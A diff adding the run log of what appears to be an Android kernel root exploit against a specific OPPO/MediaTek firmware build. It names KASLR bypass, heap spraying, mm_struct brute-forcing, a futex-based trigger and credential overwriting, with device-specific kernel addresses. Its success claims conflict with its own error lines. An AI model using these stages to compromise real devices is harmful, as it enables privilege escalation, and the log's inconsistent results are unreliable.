@@ -1,0 +1,308 @@
+[32m[+] [0mpreload starting pid=25528
+[32m[+] [0mstartup context pid=25528 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=0
+[32m[+] [0mstartup limits pid=25528 NoNewPrivs=0 Seccomp=0 Seccomp_filters=0
+[32m[+] [0mbuild config pid=25528 label=oppo_pgu110_16.0.5.1001_cn01 slide=pselect main=pselect
+[32m[+] [0mp0 profile pid=25528 phys_offset=0000000080000000 kernel_phys_load=00000000a8000000 delta=0000000028000000 slide_logger=ffffff802a7c14b8 bootid_data=ffffff802ab99b6d init_task=ffffff802a7cc000 root_tg=ffffff802a9c8040 sysctl_bootid=ffffff802ab99b6d
+[33m[*] [0mmt16: skipping SLIDE warmup per PSELECT_SKIP_WARMUP
+[32m[+] [0mslide-kaslr-mtk-hardcoded pid=25528 base=ffffffc008000000 slide=0000000000000000 warmup=0
+[33m[*] [0mmt19: SLIDE trigger route (real CVE path)
+[33m[*] [0mmt28c: CRED overwrite mode
+[33m[*] [0mprepare_kernel_page enter: payload=1 (0=FOPS,1=SLIDE)
+[33m[*] [0mprepare_kernel_page: ctxs ready, cloning 272 prepare + 204 spray + 33 pre + 34 post...
+[33m[*] [0mprepare_kernel_page: prepare+spray children cloned, now spray...
+[33m[*] [0mprepare_kernel_page: spray children done, setup KernelSnitch...
+[33m[*] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (4) mte disabled
+[33m[*] [0mmt18-diag: ks_setup done
+[33m[*] [0mmt18-diag: pre clones done
+[33m[*] [0mmt18-diag: leak child forked
+[33m[*] [0mmt18-diag: post clones done
+[33m[*] [0mstart finding collisisons
+[33m[*] [0mtarget    0000007a21e2a0c8
+[33m[*] [0mmt47-c: leak pin via SCM_RIGHTS OK (fd=513)
+[33m[*] [0mmt18-diag: memfds opened
+[33m[*] [0mmt18-diag: pre children killed
+[33m[*] [0m  000000699c2bfbf8
+[33m[*] [0mmt18-diag: post children killed
+[33m[*] [0m  000000699c99c2e0
+[33m[*] [0m  000000699cda8340
+[33m[*] [0mfound 3 collisisons
+[33m[*] [0mmt18-diag: spray children killed
+[33m[*] [0mmt18-diag: leak child reaped (attempt 1)
+[33m[*] [0mprepare_kernel_page: checking KernelSnitch collisions...
+[33m[*] [0mstart bruteforcing
+[33m[*] [0m[  1] start finding mm_struct [ffffff8800000000-ffffff9000000000]
+[33m[*] [0m[  2] start finding mm_struct [ffffff9000000000-ffffff9800000000]
+[33m[*] [0m[  0] start finding mm_struct [ffffff8000000000-ffffff8800000000]
+[33m[*] [0m[  6] start finding mm_struct [ffffffb000000000-ffffffb800000000]
+[33m[*] [0m[  5] start finding mm_struct [ffffffa800000000-ffffffb000000000]
+[33m[*] [0m[  4] start finding mm_struct [ffffffa000000000-ffffffa800000000]
+[33m[*] [0m[  7] start finding mm_struct [ffffffb800000000-ffffffc000000000]
+[33m[*] [0m[  3] start finding mm_struct [ffffff9800000000-ffffffa000000000]
+[33m[*] [0mprepare_kernel_page: SKB reclaim sends (2 rounds)...
+[33m[*] [0mdone
+[33m[*] [0mmt19: SLIDE page prepared base=0xffffff87faf78000
+[33m[*] [0mmt28c: perf task=0xffffff8a4e76ca00 (172/256 votes)
+[33m[*] [0mmt39: cred_cand=ffffff88cfd17840 votes=14 (task=ffffff8a4e76ca00 diff=-6419730880
+[33m[*] [0mmt40: task=ffffff8a4e76ca00 cred_addr=ffffff88cfd17840 uid_ptr=ffffff88cfd17840
+[33m[*] [0mmt90: CAPS-ONLY cred=ffffff88cfd17840 eff=ffffff88cfd17878 pc=ffffff88cfd17870 right=ffffff87faf780c0 (val_low=c0)
+[33m[*] [0mmt28m: cred write attempt 1/1 fake_cred=ffffff802a7e0be0
+[33m[*] [0mmt33: child pid=556 task=ffffff8a4e76ca00 blocking-for-cred-write
+[33m[*] [0mmt59: owner armed - blocking on chain mutex
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt60: pre-requeue words f_wait=0 target=560 chain=2147484207
+[33m[*] [0mmt59: requeue fired ret=-1 errno=35
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt81: consumer seq=0 seen=0 stop=0 route_done=0 calls=0 tid=561
+[33m[*] [0mmt60: waiter FWRQ ret=-1 errno=110 (0=拿锁 ETIMEDOUT=110 超时醒 EAGAIN=11 未阻塞) wake_secs=3
+[33m[*] [0mmt60: waiter UNLOCK_PI(chain) ret=0 errno=0
+[33m[*] [0mmt57: canary planted gword=14 magic=5ca7ab1e5ca7ab1e
+[33m[*] [0mmt61: pselect window=120s (mt60 时代为 2s 死值) mt66: watchdog=128s shots=16 enter_delay=50000usec t=0ms
+[33m[*] [0mmt82: consumer seq 0->1 (seen=0) t=0ms
+[33m[*] [0mmt60: owner chain LOCK_PI ret=0 errno=0 (woken)
+[33m[*] [0mmt19b: sched attempt=0 tid=559 ret=0 errno=0 t=50ms
+[33m[*] [0mmt19b: sched attempt=1 tid=560 ret=0 errno=0 t=50ms
+[33m[*] [0mmt19b: sched attempt=2 tid=559 ret=0 errno=0 t=50ms
+[33m[*] [0mmt19b: sched attempt=3 tid=560 ret=0 errno=0 t=50ms
+[33m[*] [0mmt19b: sched attempt=4 tid=559 ret=0 errno=0 t=50ms
+[33m[*] [0mmt25: futex trigger 0 ret=-1 errno=110 t=50ms
+[31m[-] [0mmt57: CANARY CORRUPTED gword=14 got=dca7ab1e5ca7ab1e want=5ca7ab1e5ca7ab1e - stray writes on waiter stack, geometry MISALIGNED - aborting shots ti=1 (hits=1)
+[33m[*] [0mmt66: window wake armed ret=0 errno=0 (storm done at t=72ms)
+[33m[*] [0mslide pselect returned ret=7 errno=0 calls=1 sched_ok=1 last_sched_ret=0 last_sched_errno=0 t=74ms
+[33m[*] [0mmt86b: owner UNPOISON unlock(target) ret=0 errno=0
+[33m[*] [0mmt87b: UNPOISON lock_pi(target) ret=0 errno=0 (5s cap)
+[33m[*] [0mmt87b: UNPOISON unlock(target) ret=0 errno=0 done=1
+[31m[-] [0mslide bad leaked pointer=8f44b3f16366c7c2
+[32m[+] [0mmt47: ROOT-SEEN ids uid=2000 euid=2000 suid=2000 gid=2000 egid=2000 sgid=2000 CapEff=ffffff87faf780c0 poll=16
+[33m[*] [0mmt73: sethostname(glroot) signal sent
+[33m[*] [0mmt47: after setres uid=0 euid=0 gid=0 egid=0
+[33m[*] [0mmt47: setenforce probe wr=1 errno=13
+[32m[+] [0mmt47: ksud loader launched (uid=0) pid=556
+[32m[+] [0mmt92: root payload done, exiting 42 (uid=0)
+sh: can't create /data/local/tmp/ksu_go.log: Permission denied
+[32m[+] [0mmt47: CHILD-ROOT attempt=1
+[32m[+] [0mmt28g: ★★★ ROOT MARKER WRITTEN uid=2000 ★★★
+/dev/null
